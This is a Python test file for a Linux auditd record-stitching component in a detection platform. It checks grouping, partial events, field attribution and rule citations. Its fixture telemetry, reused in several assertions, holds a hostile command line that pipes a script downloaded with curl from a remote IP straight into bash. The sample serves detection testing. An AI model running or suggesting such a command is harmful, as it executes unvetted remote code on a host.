"""D4 · auditd record stitching acceptance.

ONE real Linux execution must become ONE coherent canonical event, with every
contributing raw record preserved and every field attributable to the record
that supplied it. Nothing may be invented for an incomplete group.

Owner acceptance list:
  1 complete multi-record execution   6 two executions in the same second
  2 missing one expected record       7 same PID, different audit event
  3 out-of-order records              8 malformed record
  4 duplicate record                  9 unknown record type
  5 delayed record                   10 restart / buffer boundary
Plus: D8 compatibility on the stitched event.
"""
from __future__ import annotations

from detection_content.library import REGISTRY
from detection_content.telemetry.auditd_stitcher import (audit_identity,
                                                         plan_stitch,
                                                         record_type,
                                                         stitch_batch)
from detection_content.telemetry.linux_auditd_dsm import LinuxAuditdDSM

DSM = LinuxAuditdDSM()
AUD = "1757452888.555:9002"

SYSCALL = (f'type=SYSCALL msg=audit({AUD}): arch=c000003e syscall=59 '
           f'success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=0 euid=0 '
           f'tty=pts0 comm="bash" exe="/usr/bin/bash" key="exec"')
EXECVE = (f'type=EXECVE msg=audit({AUD}): argc=3 a0="/bin/bash" a1="-c" '
          f'a2="curl -s http://198.51.100.9/x.sh | bash"')
PROCTITLE = (f'type=PROCTITLE msg=audit({AUD}): '
             f'proctitle=2F62696E2F62617368002D63')
CWD = f'type=CWD msg=audit({AUD}): cwd="/home/deploy"'


def ev(line, tenant="t-stitch", collector="col-1"):
    return {"tenant_id": tenant, "collector_id": collector, "line": line,
            "message": line, "payload_format": "auditd",
            "source": "prod-host-1"}


def canon(stitched, tenant="t-stitch"):
    raw = {**stitched, "line": stitched["_primary_line"],
           "message": stitched["_primary_line"], "tenant_id": tenant,
           "source": "prod-host-1"}
    parsed = DSM.select_parser().parse(raw)
    return DSM.select_normalizer().normalize(
        parsed, DSM.id, "col-1", "int-1", "trace-1", tenant_id=tenant)


def plan(lines, tenant="t-stitch", collector="col-1"):
    return plan_stitch(lines, [tenant] * len(lines),
                       [collector] * len(lines))


# ── 1 · complete multi-record execution ───────────────────────────────
def test_one_execution_becomes_one_coherent_event():
    p = plan([SYSCALL, EXECVE, PROCTITLE])
    assert len(p["stitched"]) == 1, "three records, one execution"
    assert sorted(p["roles"].values()) == ["MEMBER", "MEMBER", "PRIMARY"]

    st = list(p["stitched"].values())[0]
    assert st["_completeness"] == "COMPLETE"
    c = canon(st)

    # The contradiction D4 exists to remove: privilege AND the real command
    # line must now be true of the SAME event.
    assert c["identity"]["is_privileged"] is True
    assert "curl -s http://198.51.100.9/x.sh | bash" in \
        c["process"]["command_line"]
    assert c["process"]["pid"] == 5678
    assert c["process"]["ppid"] == 1234
    assert c["process"]["executable_path"] == "/usr/bin/bash"
    assert c["event_type"] == "process_execution"


def test_syscall_is_preferred_as_primary_whatever_the_arrival_order():
    for order in ([EXECVE, PROCTITLE, SYSCALL], [PROCTITLE, SYSCALL, EXECVE]):
        p = plan(order)
        primary = [i for i, r in p["roles"].items() if r == "PRIMARY"][0]
        assert record_type(order[primary]) == "SYSCALL"


# ── 2 · missing one expected record ───────────────────────────────────
def test_missing_syscall_is_partial_and_never_claims_unprivileged():
    p = plan([EXECVE, PROCTITLE])
    st = list(p["stitched"].values())[0]
    assert st["_completeness"] == "PARTIAL"
    assert st["_missing_records"] == ["SYSCALL"]

    c = canon(st)
    add = c["additional_fields"]
    assert add["stitch_completeness"] == "PARTIAL"
    assert add["identity_observed"] is False
    assert add["identity_state"] == "NOT_OBSERVED"
    # The whole point: absence of the identity record must NOT become the
    # claim "an unprivileged user did this".
    assert c["identity"]["username"] == ""
    assert "privilege is unknown, not unprivileged" in \
        add["identity_not_observed_reason"]
    # The real command line is still preserved.
    assert "curl" in c["process"]["command_line"]


def test_missing_execve_is_partial_too():
    p = plan([SYSCALL])
    st = list(p["stitched"].values())[0]
    assert st["_completeness"] == "PARTIAL"
    assert st["_missing_records"] == ["EXECVE"]
    c = canon(st)
    # Identity WAS observed here, so it is asserted normally.
    assert c["identity"]["is_privileged"] is True
    assert c["additional_fields"]["identity_observed"] is True


# ── 3 · out-of-order records ──────────────────────────────────────────
def test_out_of_order_records_produce_an_identical_event():
    a = canon(list(plan([SYSCALL, EXECVE, PROCTITLE])["stitched"].values())[0])
    b = canon(list(plan([PROCTITLE, EXECVE, SYSCALL])["stitched"].values())[0])
    for key in ("event_id", "event_type", "source_event_id"):
        assert a[key] == b[key]
    assert a["process"] == b["process"]
    assert a["identity"] == b["identity"]


# ── 4 · duplicate record ──────────────────────────────────────────────
def test_duplicate_record_is_preserved_not_merged_over():
    p = plan([SYSCALL, EXECVE, EXECVE])
    st = list(p["stitched"].values())[0]
    dupes = st["_duplicate_records"]
    assert len(dupes) == 1
    assert dupes[0]["record_type"] == "EXECVE"
    assert dupes[0]["position"] == 1
    # All three raw records survive, and the duplicate did not overwrite the
    # first EXECVE's argv.
    assert len(st["_contributing_records"]) == 3
    c = canon(st)
    assert len(c["evidence_refs"]) == 3
    assert "curl" in c["process"]["command_line"]


def test_redelivery_of_the_same_audit_event_is_idempotent():
    """A stitched event re-delivered must not become a second event."""
    first = canon(list(plan([SYSCALL, EXECVE])["stitched"].values())[0])
    second = canon(list(plan([SYSCALL, EXECVE])["stitched"].values())[0])
    assert first["event_id"] == second["event_id"]
    assert first["event_id"].startswith("cev_auditd_")


def test_event_id_is_scoped_by_tenant_and_collector():
    a = canon(list(plan([SYSCALL, EXECVE], tenant="t-a")["stitched"]
                   .values())[0], tenant="t-a")
    b = canon(list(plan([SYSCALL, EXECVE], tenant="t-b")["stitched"]
                   .values())[0], tenant="t-b")
    assert a["event_id"] != b["event_id"], \
        "two tenants must never share a canonical identity"


# ── 5 · delayed record (arrives in a later batch) ─────────────────────
def test_a_delayed_record_forms_its_own_partial_event_not_a_silent_merge():
    """A record arriving in a later batch cannot retroactively change an
    event already emitted. It must surface as its own partial group, linked
    by the same audit identity, rather than mutate history."""
    batch1 = plan([SYSCALL, EXECVE])
    late = plan([PROCTITLE])
    first = canon(list(batch1["stitched"].values())[0])
    second = canon(list(late["stitched"].values())[0])
    assert second["additional_fields"]["stitch_completeness"] == "PARTIAL"
    # Same audit identity is retained, so the two are linkable.
    assert first["source_event_id"] == second["source_event_id"] == AUD
    # ...but they are NOT the same canonical event, because the second was
    # assembled from different evidence.
    assert first["process"]["command_line"] != \
        second["process"]["command_line"]


# ── 6 · two executions in the same second ─────────────────────────────
def test_two_executions_in_the_same_second_are_never_merged():
    other = SYSCALL.replace(":9002", ":9003").replace("pid=5678", "pid=9999")
    other_ex = (f'type=EXECVE msg=audit(1757452888.555:9003): argc=1 '
                f'a0="/usr/bin/id"')
    p = plan([SYSCALL, EXECVE, other, other_ex])
    assert len(p["stitched"]) == 2, \
        "same epoch, different serial = different executions"
    events = [canon(s) for s in p["stitched"].values()]
    assert len({e["event_id"] for e in events}) == 2
    cmds = sorted(e["process"]["command_line"] for e in events)
    assert any("curl" in c for c in cmds)
    assert any("/usr/bin/id" in c for c in cmds)


def test_grouping_uses_the_full_audit_identity_not_just_the_serial():
    # Same serial, different epoch — auditd serials reset, so the epoch is
    # part of the identity.
    later = SYSCALL.replace("1757452888.555", "1757452999.111")
    p = plan([SYSCALL, later])
    assert len(p["stitched"]) == 2
    assert audit_identity(SYSCALL) != audit_identity(later)


# ── 7 · same PID, different audit event ───────────────────────────────
def test_same_pid_in_different_audit_events_is_not_stitched():
    same_pid_other_event = SYSCALL.replace(":9002", ":9500")
    p = plan([SYSCALL, same_pid_other_event])
    assert len(p["stitched"]) == 2, \
        "pid is reused by the kernel and must never be a stitch key"


# ── 8 · malformed record ──────────────────────────────────────────────
def test_malformed_records_pass_through_and_are_never_stitched():
    for bad in ("", "not an audit line at all",
                "type=SYSCALL missing the audit id",
                "msg=audit(1757452888.555:9002): no type field"):
        p = plan([bad])
        assert p["stitched"] == {}
        assert p["roles"][0] == "PASSTHROUGH", bad


def test_a_malformed_record_does_not_damage_a_valid_group():
    p = plan([SYSCALL, "garbage", EXECVE])
    assert len(p["stitched"]) == 1
    st = list(p["stitched"].values())[0]
    assert st["_completeness"] == "COMPLETE"
    assert p["roles"][1] == "PASSTHROUGH"
    assert p["report"]["passthrough_events"] == 1


# ── 9 · unknown record type ───────────────────────────────────────────
def test_unknown_record_type_is_preserved_and_reported():
    avc = f'type=AVC msg=audit({AUD}): avc: denied {{ read }} for pid=5678'
    p = plan([SYSCALL, EXECVE, avc])
    st = list(p["stitched"].values())[0]
    assert "AVC" in st["_unknown_record_types"]
    assert len(st["_contributing_records"]) == 3, "nothing may be dropped"
    c = canon(st)
    assert "AVC" in c["additional_fields"]["stitch_unknown_record_types"]
    assert len(c["evidence_refs"]) == 3


# ── 10 · restart / buffer boundary ────────────────────────────────────
def test_a_group_split_across_batches_yields_two_honest_partials():
    """At a restart or buffer boundary a group can be split. Each half must
    be honestly partial — never a complete event assembled from half the
    evidence."""
    first = list(plan([SYSCALL])["stitched"].values())[0]
    second = list(plan([EXECVE, PROCTITLE])["stitched"].values())[0]
    assert first["_completeness"] == "PARTIAL"
    assert second["_completeness"] == "PARTIAL"
    a, b = canon(first), canon(second)
    assert a["additional_fields"]["identity_observed"] is True
    assert b["additional_fields"]["identity_observed"] is False
    # Both retain the audit identity, so an operator can see they belong
    # together even though neither claims to be the whole story.
    assert a["source_event_id"] == b["source_event_id"] == AUD


def test_empty_batch_is_safe():
    p = plan([])
    assert p["stitched"] == {} and p["roles"] == {}
    out, report = stitch_batch([])
    assert out == [] and report["input_events"] == 0


# ── raw preservation and field attribution ────────────────────────────
def test_every_contributing_raw_record_is_preserved_verbatim():
    st = list(plan([SYSCALL, EXECVE, PROCTITLE, CWD])["stitched"].values())[0]
    lines = [r["line"] for r in st["_contributing_records"]]
    for original in (SYSCALL, EXECVE, PROCTITLE, CWD):
        assert original in lines, "a raw record was lost"
    c = canon(st)
    refs = [r["line"] for r in c["evidence_refs"]]
    for original in (SYSCALL, EXECVE, PROCTITLE, CWD):
        assert original in refs


def test_each_field_is_attributed_to_the_record_that_supplied_it():
    st = list(plan([SYSCALL, EXECVE, PROCTITLE, CWD])["stitched"].values())[0]
    attr = st["_field_attribution"]
    assert attr["uid"] == "SYSCALL"
    assert attr["pid"] == "SYSCALL"
    assert attr["exe"] == "SYSCALL"
    assert attr["a2"] == "EXECVE"
    assert attr["proctitle"] == "PROCTITLE"
    assert attr["cwd"] == "CWD"

    canon_attr = st["_canonical_attribution"]
    assert canon_attr["identity"] == "SYSCALL"
    assert canon_attr["process.argv"] == "EXECVE"
    assert canon_attr["working_directory"] == "CWD"
    # Nothing is attributed to a record that never arrived.
    assert canon_attr["file.path"] is None

    c = canon(st)
    assert c["additional_fields"]["stitch_field_attribution"]["a2"] == "EXECVE"


def test_identity_fields_are_never_shadowed_by_a_later_record():
    """EXECVE first must not let argv keys displace SYSCALL identity."""
    st = list(plan([EXECVE, SYSCALL])["stitched"].values())[0]
    assert st["_field_attribution"]["uid"] == "SYSCALL"
    c = canon(st)
    assert c["identity"]["is_privileged"] is True
    assert c["process"]["pid"] == 5678


# ── D8 compatibility · citation from the stitched event ───────────────
def test_d8_citation_is_produced_from_the_stitched_event():
    """Detection -> citation -> canonical field -> stitched event ->
    original audit record, with nothing invented on the way."""
    st = list(plan([SYSCALL, EXECVE, PROCTITLE])["stitched"].values())[0]
    c = canon(st)

    matches = REGISTRY.evaluate_event(c)
    ids = [m["rule_id"] for m in matches]
    assert "DET-EX-006" in ids, f"expected a match on the stitched event, " \
                                f"got {ids}"
    m = next(x for x in matches if x["rule_id"] == "DET-EX-006")
    cit = m["citation"]
    assert cit["declaration_state"] == "DECLARED"
    assert cit["citation_completeness"] == "CITED"
    assert cit["matched_conditions"], "a match must cite something"

    for cond in cit["matched_conditions"]:
        assert cond["canonical_field"] == "process.command_line"
        # The cited value is the STITCHED command line, which only exists
        # because EXECVE's argv was merged with the SYSCALL record.
        assert "curl -s http://198.51.100.9/x.sh | bash" in \
            cond["observed_value"]
        assert cond["evidence_ref"].endswith(c["event_id"])

    # ...and that value traces back to a specific original audit record.
    argv_source = c["additional_fields"]["stitch_canonical_attribution"][
        "process.argv"]
    assert argv_source == "EXECVE"
    execve_raw = next(r for r in c["evidence_refs"]
                      if r["record_type"] == "EXECVE")
    assert execve_raw["line"] == EXECVE


def test_citation_would_be_impossible_without_stitching():
    """The regression this gate exists to prevent: EXECVE alone cannot be
    attributed, and SYSCALL alone has no real command line to cite."""
    syscall_only = canon(list(plan([SYSCALL])["stitched"].values())[0])
    assert "curl" not in (syscall_only["process"]["command_line"] or "")
    assert REGISTRY.evaluate_event(syscall_only) == [] or \
        "DET-EX-006" not in [m["rule_id"]
                             for m in REGISTRY.evaluate_event(syscall_only)]

    execve_only = canon(list(plan([EXECVE])["stitched"].values())[0])
    assert "curl" in execve_only["process"]["command_line"]
    # It can now be detected, but it cannot be attributed to a user...
    assert execve_only["identity"]["username"] == ""
    # ...and the platform says so rather than guessing.
    assert execve_only["additional_fields"]["identity_state"] == "NOT_OBSERVED"
